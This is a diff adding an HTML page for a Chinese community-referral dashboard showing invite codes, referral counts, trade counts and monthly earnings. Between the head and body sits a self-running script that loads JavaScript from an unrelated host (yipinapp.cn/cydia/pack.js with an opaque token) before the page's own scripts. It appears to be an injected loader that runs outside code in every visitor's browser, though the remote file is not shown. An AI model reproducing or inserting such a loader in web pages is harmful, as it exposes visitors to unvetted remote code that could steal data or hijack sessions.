@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>我的社群</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/home/community.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">我的社群</div>
+		</header>
+		<div class="communityBox">
+			<div class="simpleBox myInvite">
+				<div class="inviteAbove">
+					<div class="inviteLeft">
+						<ul>
+							<li>我的邀请码：
+								<span id="inviteTxt"></span>
+								<img id="imgCopy" src="../../static/images/fuzhi_1.png" />
+							</li>
+							<li>  绑定支付方式：
+								<span class="ifbind"></span>
+							</li>
+							<li>节点属性：
+                        		<span class="nickNode"></span>
+							</li>
+						</ul>
+					</div>
+					<div class="inviteright">
+						<a href="inviteship.html" class="weui-btn mybgBtn">邀请好友</a>
+					</div>
+				</div>
+				<div class="fourInvite">
+					<ul>
+						<li>
+							<p>直推总人数</p>
+							<h3 class="direct"></h3>
+						</li>
+						<li>
+							<p>社群总人数</p>
+							<h3 class="general"></h3>
+						</li>
+						<li>
+							<p>社群交易单数</p>
+							<h3 class="trading"></h3>
+						</li>
+						<li>
+							<p>当月收益</p>
+							<h3 class="earnings"></h3>
+						</li>
+					</ul>
+				</div>
+			</div>
+			<div class="simpleBox">
+				<div class="weui-panel weui-panel_access">
+					<div class="weui-panel__hd">
+						<img src="../../static/images/mingxi.png" />
+				  		<span class="pealTile">每月明细</span>
+					</div>
+				  	<div class="weui-panel__bd">
+				    	<div id="container"></div>
+				    	<table class="monthDiv" id="table">
+				    		<thead>
+				    			<tr>
+					    			<th>日期</th>
+					    			<th>邀请人数</th>
+					    			<th>活跃用户</th>
+					    			<th>社群人数</th>
+					    		</tr>
+				    		</thead>
+				    		<tbody id="definite">
+
+				    		</tbody>
+				    	</table>
+				  	</div>
+				</div>
+			</div>
+			<div class="simpleBox">
+				<div class="weui-panel weui-panel_access">
+					<div class="weui-panel__hd">
+						<img src="../../static/images/jiaoyiliang.png" />
+				  		<span class="pealTile">每月交易量</span>
+					</div>
+				  	<div class="weui-panel__bd">
+				    	<div id="echartLine"></div>
+				    	<table class="monthDiv" id="table-two">
+				    		<thead>
+				    			<tr>
+					    			<th>日期</th>
+					    			<th>交易单数</th>
+					    			<th>个人收益</th>
+					    		</tr>
+				    		</thead>
+				    		<tbody id="tradingVolume">
+
+				    		</tbody>
+				    	</table>
+				  	</div>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/echarts.min.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/home/community.js" ></script>
+		<script type="text/javascript" src="../../static/js/home/line-echart.js" ></script>
+	</body>
+</html>
